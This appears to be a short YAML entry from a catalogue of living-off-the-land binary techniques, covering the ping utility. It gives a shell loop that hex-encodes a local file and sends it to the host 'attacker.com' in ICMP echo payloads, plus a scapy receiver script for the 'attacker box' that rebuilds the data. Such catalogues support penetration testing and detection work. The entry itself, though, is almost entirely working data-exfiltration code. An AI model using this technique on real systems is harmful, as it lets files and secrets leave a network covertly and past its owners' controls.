---
description: send ICMP ECHO_REQUEST packets to network hosts.
functions:
  file-upload:
    - description: |
        To collect the file run the following on the attacker box:

            python3 ping_reciver.py

        ```
        #!/usr/bin/python3
        import sys
        try:
            from scapy.all import *
        except:
            print("Scapy not found, please install scapy: pip install scapy")
            sys.exit(0)

        def process_packet(pkt):
            if pkt.haslayer(ICMP):
                if pkt[ICMP].type == 8:
                    data = pkt[ICMP].load[-4:]
                    print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

        sniff(iface="eth0", prn=process_packet)
        ```
        Send a local file via ICMP.
      code: |
        RHOST=attacker.com
        LFILE=file_to_read
        xxd -p -c 4 $LFILE | while read line; do
        ping -c 1 -p $line $RHOST
        done
---
